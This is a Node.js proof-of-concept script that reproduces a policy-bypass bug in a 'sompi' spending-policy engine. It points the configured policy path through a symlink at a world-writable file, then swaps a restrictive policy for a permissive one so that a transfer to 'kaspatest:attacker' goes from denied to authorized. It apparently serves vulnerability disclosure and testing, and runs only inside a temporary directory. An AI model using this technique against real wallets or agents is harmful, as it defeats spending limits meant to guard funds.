#!/usr/bin/env node

import { createHash } from "node:crypto";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { pathToFileURL } from "node:url";

const EXPECTED_POLICY_SOURCE_SHA256 =
  "f0ff964134f662238e787c521806b4441483fb664f87cdcccf0c202b153f0f57";
const EXPECTED_POLICY_MODULE_SHA256 =
  "35c1d63d8e83c46b843284391b4bcb61e6e07c20f1fbeeb9e4622ad119da7305";

const targetRoot = path.resolve(process.argv[2] ?? ".");
const policyModulePath = path.join(targetRoot, "dist", "policy.js");
const policySourcePath = path.join(targetRoot, "src", "policy.ts");
const packagePath = path.join(targetRoot, "package.json");

for (const required of [policyModulePath, packagePath]) {
  if (!fs.statSync(required, { throwIfNoEntry: false })?.isFile()) {
    console.error(
      "usage: node policy-symlink-reload.mjs <built-sompi-checkout>"
    );
    console.error("the target must contain package.json and dist/policy.js");
    process.exit(2);
  }
}

const policyModuleSha256 = sha256File(policyModulePath);
const policySourceSha256 = fs.existsSync(policySourcePath)
  ? sha256File(policySourcePath)
  : undefined;
const packageVersion = JSON.parse(fs.readFileSync(packagePath, "utf8")).version;
const { PolicyEngine } = await import(pathToFileURL(policyModulePath).href);

const directory = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-policy-poc-"));
const target = path.join(directory, "agent-writable-policy.json");
const configured = path.join(directory, "operator-policy.json");
const restrictive = {
  maxSompiPerTx: "10",
  maxSompiPerHour: "10",
  allowlist: ["kaspatest:operator-approved"],
  requireApprovalAboveSompi: "1",
};
const permissive = {
  maxSompiPerTx: "1000",
  maxSompiPerHour: "1000",
  allowlist: [],
  requireApprovalAboveSompi: "0",
};

let startupError;
let before;
let after;
let activePolicy;
let configuredPathIsSymlink = false;
let followedTargetMode;

const originalConsoleError = console.error.bind(console);
console.error = (...values) => {
  originalConsoleError(
    ...values.map((value) =>
      typeof value === "string"
        ? value.replaceAll(directory, "<temporary-directory>")
        : value
    )
  );
};

try {
  fs.writeFileSync(target, JSON.stringify(restrictive), { mode: 0o666 });
  fs.chmodSync(target, 0o666);
  fs.symlinkSync(path.basename(target), configured);
  configuredPathIsSymlink = fs.lstatSync(configured).isSymbolicLink();
  followedTargetMode = (fs.statSync(configured).mode & 0o777)
    .toString(8)
    .padStart(3, "0");

  try {
    const engine = new PolicyEngine(directory, configured);
    before = authorize(engine);

    const oldMtimeMs = fs.statSync(target).mtimeMs;
    fs.writeFileSync(target, JSON.stringify(permissive));
    fs.chmodSync(target, 0o666);
    const changed = new Date(oldMtimeMs + 2_000);
    fs.utimesSync(target, changed, changed);

    after = authorize(engine);
    activePolicy = engine.describe();
  } catch (error) {
    startupError = errorShape(error);
  }
} finally {
  console.error = originalConsoleError;
  fs.rmSync(directory, { recursive: true, force: true });
}

const reproduced =
  startupError === undefined &&
  before?.allowed === false &&
  after?.allowed === true &&
  configuredPathIsSymlink &&
  followedTargetMode === "666";

console.log(
  JSON.stringify(
    {
      target: {
        packageVersion,
        policySourceSha256,
        exactPolicySourceMatch:
          policySourceSha256 === EXPECTED_POLICY_SOURCE_SHA256,
        policyModuleSha256,
        exactPolicyModuleMatch:
          policyModuleSha256 === EXPECTED_POLICY_MODULE_SHA256,
      },
      configuredPathIsSymlink,
      followedTargetMode,
      startupError,
      before,
      after,
      activePolicy,
      reproduced,
    },
    null,
    2
  )
);

if (reproduced) {
  console.log("[+] restrictive denial became authorization after policy replacement");
} else {
  console.error("[-] vulnerable policy replacement behavior was not reproduced");
  process.exitCode = 1;
}

function authorize(engine) {
  try {
    engine.authorize("kaspatest:attacker", 100n);
    return { allowed: true };
  } catch (error) {
    return {
      allowed: false,
      ...errorShape(error),
    };
  }
}

function errorShape(error) {
  return {
    name: error instanceof Error ? error.name : "UnknownError",
    message: error instanceof Error ? error.message : String(error),
  };
}

function sha256File(file) {
  return createHash("sha256").update(fs.readFileSync(file)).digest("hex");
}
